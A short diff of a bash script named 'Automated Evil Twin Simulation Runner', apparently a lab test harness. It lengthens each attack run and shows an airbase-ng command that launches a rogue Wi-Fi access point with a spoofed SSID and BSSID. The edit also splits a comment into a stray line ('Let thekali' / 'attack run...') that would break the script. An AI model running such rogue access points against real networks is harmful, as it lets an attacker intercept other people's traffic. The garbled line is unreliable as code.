@@ -3,7 +3,7 @@
 # === Automated Evil Twin Simulation Runner ===
 
 LOG_FILE="evil_twin_log.csv"
-DURATION=180  # Duration in seconds for each attack
+DURATION=300  # Duration in seconds for each attack
 SLEEP_BETWEEN=10  # Seconds to wait between attacks
 
 # Ensure log file exists
@@ -75,7 +75,8 @@ for MODE in {1..6}; do
     airbase-ng -e "$SSID_NAME" -a "$BSSID" -c "$CH" $ENC_TAG "$IFACE" > /dev/null 2>&1 &
     RAP_PID=$!
 
-    # Let the attack run for DURATION seconds
+    # Let thekali
+     attack run for DURATION seconds
     sleep "$DURATION"
 
     # Kill the RAP process
